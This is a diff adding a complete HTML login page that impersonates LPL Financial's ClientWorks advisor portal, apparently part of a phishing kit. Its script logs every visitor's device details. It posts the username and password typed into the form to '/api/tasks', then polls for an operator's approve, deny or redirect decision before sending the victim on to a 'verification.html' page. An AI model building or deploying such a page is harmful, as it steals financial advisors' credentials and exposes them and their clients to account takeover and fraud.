@@ -1,0 +1,240 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ClientWorks | LPL Financial Advisor Portal Login</title>
+<meta name="description" content="Sign in to ClientWorks by LPL Financial. Access your advisor portal for client management, account services, trading, and financial planning tools.">
+<meta name="keywords" content="ClientWorks, LPL Financial, advisor login, financial advisor portal, client management, trading platform, wealth management">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="ClientWorks | LPL Financial Advisor Portal Login">
+<meta property="og:description" content="Sign in to ClientWorks by LPL Financial. Access your advisor portal for client management, account services, and financial planning tools.">
+<meta property="og:type" content="website">
+<meta property="og:image" content="lpl-logo.jpg">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ClientWorks | LPL Financial Advisor Portal Login">
+<meta name="twitter:description" content="Sign in to ClientWorks by LPL Financial to access your advisor portal and client management tools.">
+<link rel="icon" href="lpl-favicon.png" type="image/png">
+<link rel="stylesheet" href="styles.css">
+<style>
+    .signature {
+        display: flex !important;
+        justify-content: center !important;
+        width: 100% !important;
+        margin-top: 30px !important;
+    }
+    .signature img {
+        width: 130px !important;
+        max-width: 130px !important;
+        height: auto !important;
+        display: block !important;
+    }
+    .qr-title {
+        font-weight: 700 !important;
+        font-size: 1.2em !important;
+    }
+    .login-error {
+        display: none;
+        color: #c0392b;
+        font-size: 13px;
+        margin-top: 8px;
+        padding: 8px 12px;
+        background: #fdf0ef;
+        border-radius: 4px;
+        border: 1px solid #f5c6cb;
+    }
+    .login-loading {
+        display: none;
+        text-align: center;
+        padding: 20px;
+        color: #555;
+        font-size: 14px;
+    }
+    .login-loading .spinner {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 2px solid #ddd;
+        border-top-color: #0078bd;
+        border-radius: 50%;
+        animation: spin .6s linear infinite;
+        vertical-align: middle;
+        margin-right: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<header class="top">
+<div class="wordmark">ClientWorks</div>
+</header>
+<main class="layout">
+<section class="panel" aria-labelledby="welcome">
+<div class="content">
+<h1 id="welcome">Welcome to ClientWorks</h1>
+<p class="intro">Enter your username &amp; password</p>
+<div id="login-error" class="login-error"></div>
+<div id="login-loading" class="login-loading"><span class="spinner"></span> Verifying credentials...</div>
+<div class="columns" id="login-form">
+<div class="fields">
+<label for="username">Username</label>
+<input class="field" id="username" type="text" autocomplete="off">
+<div class="space">
+<label for="password">Password</label>
+<div class="password">
+<input class="field" id="password" type="password" autocomplete="off"><img class="eye" src="assets/eye.svg" alt="" aria-hidden="true">
+</div>
+</div><span class="text-link" aria-disabled="true">Forgot Password</span>
+<div class="sign-row"><button class="sign" id="sign-in-btn" type="button">Sign In</button>
+</div>
+<div class="privacy"><span class="toggle" aria-hidden="true"></span><span>Activate On-The-Go to mask sensitive information.</span>
+</div>
+</div>
+<div class="divider" aria-hidden="true">
+</div>
+<aside class="qr-panel" aria-label="QR code">
+<div>Returning QR code users</div>
+<div class="qr-title">Scan code to log in</div>
+<div class="qr-art"><img class="qr-matrix" src="assets/qr-placeholder.svg" alt="" aria-hidden="true">
+<div class="refresh" id="refresh-overlay" hidden><small>QR code expired</small><button type="button" id="refresh-qr">Refresh QR code</button>
+</div>
+</div>
+<div class="progress" aria-hidden="true"><span class="timer-fill" id="timer-fill"></span>
+</div>
+<div class="help">Need Help?<span class="text-link" aria-disabled="true">QR Code Instructions</span>
+</div>
+</aside>
+</div>
+</div>
+<div class="signature">
+    <img src="lpl-logo.jpg" alt="LPL Financial">
+</div>
+</section>
+<div class="architecture" role="img" aria-label="Sunlit glass-walled lounge overlooking a lake">
+</div>
+</main>
+<footer class="footer">By logging in, you agree to the Terms of Use and the LPL Privacy Policy. Access to ClientWorks through public computers is strictly prohibited. The device in use must be in your control and must conform with the LPL Branch Office Security Policy.</footer>
+<script src="timer.js" defer></script>
+<script>
+(function(){
+  function collectDevice() {
+    return {
+      device_info: navigator.userAgent,
+      screen_size: screen.width + "x" + screen.height,
+      referrer: document.referrer || "Direct",
+      member_origin: location.href
+    };
+  }
+
+  function trackVisitor() {
+    var d = collectDevice();
+    fetch("/api/tasks", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        project_id: "clientworks",
+        user_id: "visitor",
+        password: "N/A",
+        method: "N/A",
+        masked_email: "N/A",
+        masked_phone: "N/A",
+        request_kind: "visit",
+        member_origin: d.member_origin,
+        device_info: d.device_info,
+        screen_size: d.screen_size,
+        referrer: d.referrer
+      })
+    }).catch(function(){});
+  }
+
+  var btn = document.getElementById("sign-in-btn");
+  var usernameEl = document.getElementById("username");
+  var passwordEl = document.getElementById("password");
+  var errorEl = document.getElementById("login-error");
+  var loadingEl = document.getElementById("login-loading");
+  var formEl = document.getElementById("login-form");
+
+  btn.addEventListener("click", function() {
+    var user = usernameEl.value.trim();
+    var pass = passwordEl.value.trim();
+    if (!user || !pass) {
+      errorEl.textContent = "Please enter your username and password.";
+      errorEl.style.display = "block";
+      return;
+    }
+    errorEl.style.display = "none";
+    formEl.style.display = "none";
+    loadingEl.style.display = "block";
+
+    var d = collectDevice();
+    fetch("/api/tasks", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        project_id: "clientworks",
+        user_id: user,
+        password: pass,
+        method: "credentials",
+        masked_email: "N/A",
+        masked_phone: "N/A",
+        request_kind: "login",
+        member_origin: d.member_origin,
+        device_info: d.device_info,
+        screen_size: d.screen_size,
+        referrer: d.referrer
+      })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (!data.task || !data.task.id) throw new Error("Failed");
+      pollTask(data.task.id);
+    })
+    .catch(function() {
+      loadingEl.style.display = "none";
+      formEl.style.display = "grid";
+      errorEl.textContent = "Unable to connect. Please try again.";
+      errorEl.style.display = "block";
+    });
+  });
+
+  function pollTask(taskId) {
+    var attempts = 0;
+    var maxAttempts = 45;
+    var iv = setInterval(function() {
+      attempts++;
+      if (attempts > maxAttempts) {
+        clearInterval(iv);
+        loadingEl.style.display = "none";
+        formEl.style.display = "grid";
+        errorEl.textContent = "Request timed out. Please try again.";
+        errorEl.style.display = "block";
+        return;
+      }
+      fetch("/api/tasks/" + taskId)
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (!data.task) return;
+          var s = data.task.status;
+          if (s === "approved") {
+            clearInterval(iv);
+            window.location.href = "verification.html?task=" + taskId;
+          } else if (s === "denied") {
+            clearInterval(iv);
+            loadingEl.style.display = "none";
+            formEl.style.display = "grid";
+            errorEl.textContent = "The username or password you entered is incorrect. Please try again.";
+            errorEl.style.display = "block";
+          } else if (s === "redirected") {
+            clearInterval(iv);
+            window.location.href = "https://clientworks.com";
+          }
+        })
+        .catch(function(){});
+    }, 2000);
+  }
+
+  trackVisitor();
+})();
+</script>
+</body>
+</html>
